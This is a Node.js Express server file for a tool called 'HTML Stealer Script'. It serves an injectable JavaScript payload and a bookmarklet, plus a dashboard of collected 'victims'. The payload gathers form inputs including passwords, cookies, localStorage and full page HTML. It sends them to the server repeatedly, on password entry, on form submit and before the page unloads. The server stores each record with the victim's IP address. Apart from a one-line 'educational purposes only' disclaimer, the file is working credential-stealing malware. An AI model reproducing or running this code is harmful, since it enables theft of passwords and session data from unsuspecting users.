const express = require('express');
const fs = require('fs-extra');
const path = require('path');
const cors = require('cors');

const app = express();

// Middleware
app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));

// Ma'lumotlar papkasi
const DATA_DIR = path.join(__dirname, '../data');
fs.ensureDirSync(DATA_DIR);

// Generate Victim ID
function generateVictimId() {
    return 'victim_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
}

// Generate File ID
function generateFileId() {
    return 'file_' + Date.now() + '_' + Math.random().toString(36).substr(2, 6);
}

// ========== ROUTES ==========

// 1. Asosiy sahifa
app.get('/', (req, res) => {
    const html = `
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>🕵️ HTML Stealer Script</title>
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body {
                font-family: 'Courier New', monospace;
                background: #0f0f0f;
                color: #00ff00;
                line-height: 1.6;
                padding: 20px;
            }
            .container { max-width: 1000px; margin: 0 auto; }
            .header {
                text-align: center;
                padding: 30px 0;
                border-bottom: 2px solid #00ff00;
                margin-bottom: 30px;
            }
            .header h1 {
                font-size: 2.5em;
                margin-bottom: 10px;
                text-shadow: 0 0 10px #00ff00;
            }
            .header p { color: #aaa; }
            .card {
                background: #1a1a1a;
                border: 1px solid #333;
                border-radius: 5px;
                padding: 20px;
                margin-bottom: 20px;
            }
            .card h2 {
                color: #00ff00;
                margin-bottom: 15px;
                border-bottom: 1px solid #333;
                padding-bottom: 10px;
            }
            .code-box {
                background: #000;
                border: 1px solid #333;
                border-radius: 3px;
                padding: 15px;
                font-family: monospace;
                white-space: pre-wrap;
                word-wrap: break-word;
                color: #00ff00;
                margin: 10px 0;
                overflow-x: auto;
            }
            .btn {
                display: inline-block;
                background: #00ff00;
                color: #000;
                padding: 10px 20px;
                text-decoration: none;
                border-radius: 3px;
                font-weight: bold;
                margin: 5px;
                border: none;
                cursor: pointer;
                font-family: inherit;
            }
            .btn:hover {
                background: #00cc00;
                box-shadow: 0 0 10px #00ff00;
            }
            .endpoints { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; }
            .endpoint { background: #222; padding: 10px; border-radius: 3px; }
            .victim-list { max-height: 400px; overflow-y: auto; }
            .victim-item {
                background: #222;
                padding: 10px;
                margin: 5px 0;
                border-left: 3px solid #00ff00;
            }
            .danger { color: #ff0000; }
            .success { color: #00ff00; }
            .info { color: #00aaff; }
            footer {
                text-align: center;
                margin-top: 40px;
                padding-top: 20px;
                border-top: 1px solid #333;
                color: #666;
                font-size: 0.9em;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <h1>🕵️ HTML STEALER SCRIPT</h1>
                <p>Capture web pages with JavaScript injection</p>
                <p class="info">Repo: html-stealer-script | Active: ✅</p>
            </div>

            <div class="card">
                <h2>📊 SERVER STATS</h2>
                <p>Status: <span class="success">● RUNNING</span></p>
                <p>URL: <strong>${req.protocol}://${req.get('host')}</strong></p>
                <p>Victims Collected: <strong id="victimCount">Loading...</strong></p>
                <a href="/api/victims" class="btn">📁 VIEW VICTIMS</a>
                <a href="/api/stealer.js" class="btn">📜 GET SCRIPT</a>
            </div>

            <div class="card">
                <h2>🔗 QUICK BOOKMARKLET</h2>
                <p>Drag this to your bookmarks bar:</p>
                <div class="code-box">
                    <a href="javascript:(function(){var s=document.createElement('script');s.src='${req.protocol}://${req.get('host')}/api/stealer.js';document.body.appendChild(s);alert('Stealer activated!');})();" style="color:#00ff00;text-decoration:none;">
                    🕵️ HTML Stealer</a>
                </div>
                <p>Or copy this code:</p>
                <div class="code-box">
javascript:(function(){
    var s=document.createElement('script');
    s.src='${req.protocol}://${req.get('host')}/api/stealer.js';
    document.body.appendChild(s);
    alert('🕵️ Stealer activated!');
})();</div>
            </div>

            <div class="card">
                <h2>⚡ API ENDPOINTS</h2>
                <div class="endpoints">
                    <div class="endpoint">
                        <strong>POST</strong> /api/collect<br>
                        <small>Collect victim data</small>
                    </div>
                    <div class="endpoint">
                        <strong>GET</strong> /api/victims<br>
                        <small>List all victims</small>
                    </div>
                    <div class="endpoint">
                        <strong>GET</strong> /api/stealer.js<br>
                        <small>JavaScript stealer file</small>
                    </div>
                    <div class="endpoint">
                        <strong>GET</strong> /api/view/:id<br>
                        <small>View victim data</small>
                    </div>
                </div>
            </div>

            <div class="card">
                <h2>⚠️ WARNING</h2>
                <p class="danger">This tool is for educational purposes only!</p>
                <p>Use only on websites you own or have permission to test.</p>
                <p>Unauthorized use may be illegal.</p>
            </div>
        </div>

        <script>
            // Load victim count
            fetch('/api/victims')
                .then(r => r.json())
                .then(data => {
                    document.getElementById('victimCount').textContent = data.count || 0;
                })
                .catch(e => {
                    document.getElementById('victimCount').textContent = 'Error';
                });
        </script>
    </body>
    </html>
    `;
    res.send(html);
});

// 2. Stealer.js fayli
app.get('/api/stealer.js', (req, res) => {
    const serverUrl = `${req.protocol}://${req.get('host')}/api/collect`;
    
    const stealerScript = `
// ========================
// HTML STEALER SCRIPT v3.0
// Server: ${req.protocol}://${req.get('host')}
// ========================

(function(){
    'use strict';
    
    // Server URL
    const SERVER_URL = '${serverUrl}';
    
    // Victim ID
    function getVictimId() {
        let vid = localStorage.getItem('html_stealer_vid');
        if (!vid) {
            vid = 'vid_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
            localStorage.setItem('html_stealer_vid', vid);
        }
        return vid;
    }
    
    // Collect data
    function collectData() {
        const victimId = getVictimId();
        
        // Forms data
        const forms = [];
        document.querySelectorAll('form').forEach((form, index) => {
            const formData = {
                id: form.id || 'form_' + index,
                action: form.action,
                method: form.method,
                inputs: []
            };
            
            form.querySelectorAll('input, textarea, select').forEach(input => {
                formData.inputs.push({
                    type: input.type,
                    name: input.name,
                    id: input.id,
                    value: input.type === 'password' ? input.value : input.value,
                    placeholder: input.placeholder
                });
            });
            
            forms.push(formData);
        });
        
        // All inputs
        const inputs = [];
        document.querySelectorAll('input, textarea, select').forEach(input => {
            inputs.push({
                type: input.type,
                name: input.name,
                value: input.value,
                tagName: input.tagName.toLowerCase()
            });
        });
        
        // Page info
        const pageInfo = {
            url: window.location.href,
            title: document.title,
            userAgent: navigator.userAgent,
            referrer: document.referrer,
            language: navigator.language,
            timestamp: new Date().toISOString(),
            screen: {
                width: screen.width,
                height: screen.height
            }
        };
        
        // Storage
        const storage = {
            cookies: document.cookie,
            localStorage: {},
            sessionStorage: {}
        };
        
        try {
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                storage.localStorage[key] = localStorage.getItem(key);
            }
        } catch(e) {}
        
        // Data object
        const data = {
            victimId: victimId,
            timestamp: new Date().toISOString(),
            pageInfo: pageInfo,
            html: {
                full: document.documentElement.outerHTML.substring(0, 500000),
                body: document.body.innerHTML.substring(0, 300000)
            },
            forms: forms,
            inputs: inputs,
            storage: storage,
            links: Array.from(document.querySelectorAll('a[href]')).map(a => ({
                href: a.href,
                text: a.textContent.substring(0, 100)
            })).slice(0, 100)
        };
        
        return data;
    }
    
    // Send data
    function sendData() {
        try {
            const data = collectData();
            
            // Send with fetch
            fetch(SERVER_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(data),
                mode: 'no-cors'
            }).catch(() => {});
            
            // Send with beacon
            navigator.sendBeacon && navigator.sendBeacon(SERVER_URL, JSON.stringify(data));
            
            console.log('[Stealer] Data sent:', data.victimId);
            
        } catch(error) {
            console.error('[Stealer] Error:', error);
        }
    }
    
    // ===== INITIALIZATION =====
    
    // First send
    setTimeout(sendData, 1500);
    
    // Periodic sending (every 30 seconds)
    setInterval(sendData, 30000);
    
    // Send on page changes
    let lastHTML = document.documentElement.innerHTML;
    const observer = new MutationObserver(function() {
        if (document.documentElement.innerHTML !== lastHTML) {
            lastHTML = document.documentElement.innerHTML;
            setTimeout(sendData, 1000);
        }
    });
    
    observer.observe(document.documentElement, {
        childList: true,
        subtree: true,
        attributes: true,
        characterData: true
    });
    
    // Send on form submit
    document.addEventListener('submit', function() {
        setTimeout(sendData, 800);
    });
    
    // Send on input (especially passwords)
    document.addEventListener('input', function(e) {
        if (e.target.type === 'password' || e.target.tagName === 'TEXTAREA') {
            setTimeout(sendData, 1200);
        }
    });
    
    // Send before page unload
    window.addEventListener('beforeunload', function() {
        sendData();
    });
    
    // Log
    console.log('🕵️ HTML Stealer activated on:', window.location.href);
    
})();
    `;
    
    res.setHeader('Content-Type', 'application/javascript');
    res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
    res.send(stealerScript);
});

// 3. Data collection endpoint
app.post('/api/collect', async (req, res) => {
    try {
        const data = req.body;
        const victimId = data.victimId || generateVictimId();
        const fileId = generateFileId();
        
        // Additional info
        const fullData = {
            ...data,
            _serverInfo: {
                receivedAt: new Date().toISOString(),
                ip: req.headers['x-forwarded-for'] || req.ip,
                userAgent: req.headers['user-agent'],
                fileId: fileId
            }
        };
        
        // Save to file
        const filename = `${victimId}_${Date.now()}.json`;
        const filepath = path.join(DATA_DIR, filename);
        
        await fs.writeJson(filepath, fullData, { spaces: 2 });
        
        console.log(`📥 [${new Date().toLocaleTimeString()}] Victim: ${victimId}`);
        console.log(`   URL: ${data.pageInfo?.url || 'Unknown'}`);
        console.log(`   File: ${filename}`);
        
        res.json({
            status: 'success',
            message: 'Data collected successfully',
            victimId: victimId,
            fileId: fileId,
            timestamp: new Date().toISOString()
        });
        
    } catch (error) {
        console.error('Collection error:', error);
        res.status(500).json({
            status: 'error',
            message: error.message
        });
    }
});

// 4. List all victims
app.get('/api/victims', async (req, res) => {
    try {
        const files = await fs.readdir(DATA_DIR);
        const victims = [];
        
        for (const file of files.slice(-50)) { // Last 50 files
            if (file.endsWith('.json')) {
                const filepath = path.join(DATA_DIR, file);
                const stats = await fs.stat(filepath);
                const data = await fs.readJson(filepath);
                
                victims.push({
                    id: data.victimId || file,
                    file: file,
                    url: data.pageInfo?.url || 'Unknown',
                    title: data.pageInfo?.title || 'No title',
                    timestamp: data.timestamp || stats.birthtime,
                    size: stats.size,
                    ip: data._serverInfo?.ip || 'Unknown'
                });
            }
        }
        
        // Sort by time (newest first)
        victims.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
        
        res.json({
            status: 'success',
            count: victims.length,
            totalFiles: files.length,
            victims: victims
        });
        
    } catch (error) {
        res.status(500).json({
            status: 'error',
            message: error.message
        });
    }
});

// 5. View specific victim
app.get('/api/view/:id', async (req, res) => {
    try {
        const files = await fs.readdir(DATA_DIR);
        const file = files.find(f => f.includes(req.params.id) && f.endsWith('.json'));
        
        if (!file) {
            return res.status(404).json({
                status: 'error',
                message: 'Victim not found'
            });
        }
        
        const filepath = path.join(DATA_DIR, file);
        const data = await fs.readJson(filepath);
        
        res.json({
            status: 'success',
            data: data
        });
        
    } catch (error) {
        res.status(500).json({
            status: 'error',
            message: error.message
        });
    }
});

// 6. Delete all data
app.delete('/api/clear', async (req, res) => {
    try {
        await fs.emptyDir(DATA_DIR);
        res.json({
            status: 'success',
            message: 'All data cleared'
        });
    } catch (error) {
        res.status(500).json({
            status: 'error',
            message: error.message
        });
    }
});

// 7. Health check
app.get('/api/health', (req, res) => {
    res.json({
        status: 'healthy',
        timestamp: new Date().toISOString(),
        server: 'html-stealer-script',
        version: '3.0'
    });
});

// ========== START SERVER ==========
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`
    🚀 HTML STEALER SCRIPT SERVER
    ==============================
    🔗 Local: http://localhost:${PORT}
    📁 Data dir: ${DATA_DIR}
    ⏰ Started: ${new Date().toLocaleString()}
    ==============================
    `);
});
